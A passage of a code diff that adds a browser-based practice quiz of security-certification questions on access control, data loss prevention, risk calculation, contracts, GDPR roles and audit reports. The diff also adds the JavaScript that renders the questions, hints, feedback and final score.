"Cisco, TCP 49, full-packet encryption.", "correctExplanation": "TACACS+ (TCP 49) encrypts the entire payload and separates authentication, authorization and accounting. It's ideal for device administration.", "wrongExplanation": "TACACS+. RADIUS encrypts only the password and combines authN/authZ. It's better suited to network access (802.1X)."}, {"question": "[D4] Engineers are uploading source code to personal cloud drives. Which control BEST detects and blocks this?", "options": ["DLP", "NAC", "IPS", "SIEM"], "correctIndex": 0, "hint": "It stops sensitive data from leaving.", "correctExplanation": "DLP inspects content leaving via web, email, USB or cloud and can block exfiltration of sensitive data.", "wrongExplanation": "DLP. It's built specifically to stop data exfiltration."}, {"question": "[D4] Which log would show the source IP of a port scan and whether each connection was allowed or denied?", "options": ["Endpoint/EDR log", "Firewall log", "Application log", "DNS log"], "correctIndex": 1, "hint": "Allow/deny decisions.", "correctExplanation": "Firewall logs record source/destination IPs, ports and the allow or deny action. That's where scans show up.", "wrongExplanation": "Firewall log. Mapping: executable → endpoint · allow/deny + scan source → firewall · SQLi string → application."}, {"question": "[D4] A new hire needs accounts created automatically in 12 SaaS apps as soon as HR onboards them, and removed on termination. Which standard does this?", "options": ["SAML", "SCIM", "OAuth", "LDAP"], "correctIndex": 1, "hint": "Cross-domain identity PROVISIONING.", "correctExplanation": "SCIM (System for Cross-domain Identity Management) automates provisioning and de-provisioning across apps.", "wrongExplanation": "SCIM = provisioning. SAML = SSO authentication. OAuth = delegated authorization."}, {"question": "[D5] A server is worth $120,000. A flood would destroy 25% of it. Floods happen once every 2 years. What is the ALE?", "options": ["$30,000", "$15,000", "$60,000", "$7,500"], "correctIndex": 1, "hint": "SLE = AV × EF, then ALE = SLE × ARO.", "correctExplanation": "SLE = 120,000 × 0.25 = $30,000. ARO = 1/2 = 0.5. ALE = 30,000 × 0.5 = $15,000/yr.", "wrongExplanation": "$15,000. SLE $30,000 × ARO 0.5. $30,000 is the SLE, a common trap answer."}, {"question": "[D5] Two agencies want a document stating shared goals and intent to cooperate that is NOT legally binding. Which document?", "options": ["MOA", "MOU", "SLA", "ISA"], "correctIndex": 1, "hint": "Intent, not obligation.", "correctExplanation": "An MOU expresses mutual intent and is non-binding. An MOA sets out binding responsibilities.", "wrongExplanation": "MOU = non-binding intent. MOA = binding responsibilities."}, {"question": "[D5] The contract says the provider guarantees 99.9% uptime and pays credits if it misses. What is this document?", "options": ["SOW", "MSA", "SLA", "NDA"], "correctIndex": 2, "hint": "Measurable targets + penalties.", "correctExplanation": "An SLA defines measurable service levels and the penalties for missing them.", "wrongExplanation": "SLA. SOW = scope, cost, timeline. MSA = umbrella terms."}, {"question": "[D5] The company buys cyber-insurance to cover ransomware losses. Which risk response is this?", "options": ["Mitigate", "Accept", "Transfer", "Avoid"], "correctIndex": 2, "hint": "Someone else pays.", "correctExplanation": "Transference shifts the financial impact to a third party, such as an insurer.", "wrongExplanation": "Transfer. Insurance is the textbook example of transference."}, {"question": "[D5] After MFA, EDR and backups are deployed, some risk of breach remains. What is it called?", "options": ["Inherent risk", "Residual risk", "Risk appetite", "Risk tolerance"], "correctIndex": 1, "hint": "What's left over.", "correctExplanation": "Residual risk remains after controls are applied. Inherent risk is the level before any controls.", "wrongExplanation": "Residual risk = after controls. Inherent risk = before."}, {"question": "[D5] Under GDPR, a company decides WHY and HOW customer data is processed and hires a payroll firm to process it. The company is the:", "options": ["Processor", "Controller", "Custodian", "Data subject"], "correctIndex": 1, "hint": "The one that decides the purpose and means.", "correctExplanation": "The controller determines the purposes and means of processing. The payroll firm is the processor, acting on the controller's instructions.", "wrongExplanation": "Controller. The processor only acts on the controller's behalf."}, {"question": "[D5] A customer asks for independent, third-party assurance that a SaaS provider's controls operated effectively over 6 months. What should it request?", "options": ["Internal audit report", "SOC 2 Type II attestation", "Vulnerability scan", "Self-assessment questionnaire"], "correctIndex": 1, "hint": "Independent + a period of time.", "correctExplanation": "A SOC 2 Type II is an independent auditor's attestation of control effectiveness over a period of time. Type I covers a single point in time.", "wrongExplanation": "SOC 2 Type II. It's independent and covers a period of time."}, {"question": "[D5] A pen tester gets no network diagrams, credentials or source code, only the company name. What type of test is this?", "options": ["Known environment", "Partially known environment", "Unknown environment", "Bug bounty"], "correctIndex": 2, "hint": "Formerly black-box.", "correctExplanation": "An unknown environment (black-box) test simulates an external attacker with zero inside knowledge.", "wrongExplanation": "Unknown environment. Known = white-box. Partially known = gray-box."}, {"question": "[D5] Which document provides RECOMMENDED but optional practices?", "options": ["Policy", "Standard", "Procedure", "Guideline"], "correctIndex": 3, "hint": "Only one of these is optional.", "correctExplanation": "Guidelines are recommendations. Policies, standards and procedures are mandatory.", "wrongExplanation": "Guideline = optional. Policy > standard > procedure are all mandatory."}, {"question": "[D5] A vendor contract clause lets the customer inspect the vendor's security controls at any time. What is this clause?", "options": ["Right-to-audit clause", "Non-disclosure clause", "Rules of engagement", "Indemnification clause"], "correctIndex": 0, "hint": "The name says what it does.", "correctExplanation": "A right-to-audit clause grants the customer permission to audit the vendor's controls.", "wrongExplanation": "Right-to-audit clause."}, {"question": "[D5] A legacy app can't meet the new password standard for 90 days while it's rewritten. Leadership formally approves the deviation. What is this?", "options": ["Exemption", "Exception", "Risk transference", "Risk avoidance"], "correctIndex": 1, "hint": "It's temporary.", "correctExplanation": "An exception is a temporary, approved deviation. An exemption is a long-term or permanent release from the requirement.", "wrongExplanation": "Exception = temporary. Exemption = long-term."}, {"question": "[D5] Which metric BEST shows that a phishing-awareness program is working over time?", "options": ["Number of training modules assigned", "Declining click rate and rising report rate in simulations", "Number of blocked emails at the gateway", "Employee satisfaction survey scores"], "correctIndex": 1, "hint": "Measure behavior change.", "correctExplanation": "Simulation click rate going down and report rate going up shows real behavior change.", "wrongExplanation": "Click rate ↓ and report rate ↑. Gateway blocks measure technology, not people."}, {"question": "[D5] Before signing a new cloud vendor, the company reviews its financials, breach history and SOC reports. What is this activity?", "options": ["Due care", "Due diligence", "Risk acceptance", "Attestation"], "correctIndex": 1, "hint": "Assess BEFORE committing.", "correctExplanation": "Due diligence = investigating before the decision. Due care = ongoing protection after it.", "wrongExplanation": "Due diligence (before). Due care (continuous, after)."}];
+        const totalQuestions = questions.length;
+        let currentQuestionIndex = 0;
+        let userAnswers = []; // Store user's answers {questionIndex, selectedIndex, isCorrect}
+        let isReviewMode = false;
+
+        function renderMath(target) {
+            return; // math rendering off: no formulas in Splunk content, and KaTeX mangled ( ) and [ ]
+            if (!target || typeof renderMathInElement !== 'function') return;
+            renderMathInElement(target, {
+                delimiters: [
+                    {left: '$$', right: '$$', display: true},
+                    {left: '$', right: '$', display: false},
+                    {left: '\(', right: '\)', display: false},
+                    {left: '\[', right: '\]', display: true}
+                ],
+                throwOnError: false
+            });
+        }
+
+        function initQuiz() {
+            renderQuestion();
+        }
+
+        function renderQuestion() {
+            const quizContent = document.getElementById('quiz-content');
+            const question = questions[currentQuestionIndex];
+            const userAnswer = userAnswers[currentQuestionIndex];
+
+            const isAnswered = userAnswer !== undefined;
+
+            // Determine button states
+            const showPrevious = currentQuestionIndex > 0;
+            const showNext = isAnswered && currentQuestionIndex < totalQuestions - 1;
+            const showFinish = isAnswered && currentQuestionIndex === totalQuestions - 1 && !isReviewMode;
+            const showFinishReview = isReviewMode && currentQuestionIndex === totalQuestions - 1;
+            const showHint = !!question.hint;
+
+            let optionsHtml = '';
+            question.options.forEach((option, index) => {
+                const letter = String.fromCharCode(65 + index); // A, B, C, D
+
+                if (isAnswered) {
+                    if (index === question.correctIndex) {
+                        const correctExplain = question.correctExplanation || question.explanation || '';
+                        optionsHtml += `
+                            <div class="feedback-card correct show">
+                                <div class="feedback-answer">${letter}. ${option}</div>
+                                <div class="feedback-header correct">
+                                    <span class="feedback-icon">✓</span>
+                                    <span>Right answer</span>
+                                </div>
+                                <div class="feedback-text">${correctExplain}</div>
+                            </div>
+                        `;
+                        return;
+                    }
+
+                    if (!userAnswer.isCorrect && index === userAnswer.selectedIndex) {
+                        const wrongExplain = question.wrongExplanation || question.explanation || '';
+                        optionsHtml += `
+                            <div class="feedback-card wrong show">
+                                <div class="feedback-answer">${letter}. ${option}</div>
+                                <div class="feedback-header wrong">
+                                    <span class="feedback-icon">✕</span>
+                                    <span>Not quite</span>
+                                </div>
+                                <div class="feedback-text">${wrongExplain}</div>
+                            </div>
+                        `;
+                        return;
+                    }
+
+                    optionsHtml += `
+                        <div class="option disabled" data-index="${index}">
+                            <span class="option-label">${letter}.</span>
+                            <span class="option-text">${option}</span>
+                        </div>
+                    `;
+                    return;
+                }
+
+                const optionClass = index === (userAnswer ? userAnswer.selectedIndex : -1) ? 'option selected' : 'option';
+                optionsHtml += `
+                    <div class="${optionClass}" onclick="selectAnswer(${index})" data-index="${index}">
+                        <span class="option-label">${letter}.</span>
+                        <span class="option-text">${option}</span>
+                    </div>
+                `;
+            });
+
+            let hintHtml = '';
+            if (showHint) {
+                hintHtml = `
+                    <button class="hint-toggle" id="hint-toggle" onclick="toggleHint()">
+                        <span>Hint</span>
+                        <span class="chevron">⌃</span>
+                    </button>
+                    <div id="hint-panel" class="hint-panel">
+                        <div class="hint-title">Hint</div>
+                        <div class="hint-text">${question.hint}</div>
+                    </div>
+                `;
+            }
+
+            let buttonsHtml = `
+                <div class="quiz-footer">
+                    <div class="buttons">
+                        <div style="display: flex; gap: 12px;">
+                            <button class="btn btn-secondary" onclick="previousQuestion()" ${showPrevious ? '' : 'disabled'}>
+                                Previous
+                            </button>
+                        </div>
+                        <div>
+                            ${showNext ? '<button class="btn btn-primary" onclick="nextQuestion()">Next</button>' : ''}
+                            ${showFinish ? '<button class="btn btn-primary" onclick="finishQuiz()">Finish Quiz</button>' : ''}
+                            ${showFinishReview ? '<button class="btn btn-primary" onclick="finishReview()">Finish Review</button>' : ''}
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            quizContent.innerHTML = `
+                <div class="progress-text">${currentQuestionIndex + 1} / ${totalQuestions}</div>
+                <div class="question-text">${question.question}</div>
+                <div class="options">
+                    ${optionsHtml}
+                </div>
+                <div class="hint-slot">
+                    ${hintHtml}
+                </div>
+                ${buttonsHtml}
+            `;
+            renderMath(quizContent);
+        }
+
+        function selectAnswer(selectedIndex) {
+            const question = questions[currentQuestionIndex];
+            const isCorrect = selectedIndex === question.correctIndex;
+
+            // Store the answer
+            userAnswers[currentQuestionIndex] = {
+                questionIndex: currentQuestionIndex,
+                selectedIndex: selectedIndex,
+                isCorrect: isCorrect
+            };
+
+            // Re-render to show feedback
+            renderQuestion();
+        }
+
+        function toggleHint() {
+            const hintPanel = document.getElementById('hint-panel');
+            const hintToggle = document.getElementById('hint-toggle');
+            if (hintPanel) {
+                hintPanel.classList.toggle('show');
+            }
+            if (hintToggle) {
+                hintToggle.classList.toggle('open');
+            }
+        }
+
+        function nextQuestion() {
+            if (currentQuestionIndex < totalQuestions - 1) {
+                currentQuestionIndex++;
+                renderQuestion();
+            }
+        }
+
+        function previousQuestion() {
+            if (currentQuestionIndex > 0) {
+                currentQuestionIndex--;
+                renderQuestion();
+            }
+        }
+
+        function finishQuiz() {
+            showCompletionScreen();
+        }
+
+        function showCompletionScreen() {
+            const quizContent = document.getElementById('quiz-content');
+            const completionScreen = document.getElementById('completion-screen');
+
+            // Calculate stats
+            const answeredQuestions = userAnswers.filter(a => a !== undefined);
+            const correctAnswers = userAnswers.filter(a => a && a.isCorrect).length;
+            const wrongAnswers = userAnswers.filter(a => a && !a.isCorrect).length;
+            const skipped = totalQuestions - answeredQuestions.length;
+            const accuracy = answeredQuestions.length > 0
+                ? Math.round((correctAnswers / answeredQuestions.length) * 100)
+                : 0;
+
+            // Update stats
+            document.getElementById('score-value').textContent = `${correctAnswers}/${totalQuestions}`;
+            document.getElementById('accuracy-value').textContent = `${accuracy}%`;
+            document.getElementById('right-value').textContent = correctAnswers;
+            document.getElementById('wrong-value').textContent = wrongAnswers;
+            document.getElementById('skipped-value').textContent = skipped;
+
+            // Show completion screen
+            quizContent.style.display = 'none';
+            completionScreen.classList.add('show');
+        }
+
+        function reviewQuiz() {
+            isReviewMode = true;
+            currentQuestionIndex = 0;
+            const quizContent = document.getElementById('quiz-content');
+            const completionScreen = document.getElementById('completion-screen');
+
+            quizContent.style.display = 'block';
+            completionScreen.classList.remove('show');
+            renderQuestion();
+        }
+
+        function finishReview() {
+            showCompletionScreen();
+        }
+
+        function retakeQuiz() {
+            isReviewMode = false;
+            currentQuestionIndex = 0;
+            userAnswers = [];
+            const quizContent = document.getElementById('quiz-content');
+            const completionScreen = document.getElementById('completion-screen');
+
+            quizContent.style.display = 'block';
+            completionScreen.classList.remove('show');
+            renderQuestion();
+        }
+
+        // Initialize quiz on page load
+        initQuiz();
+    </script>
+</body>
+</html>
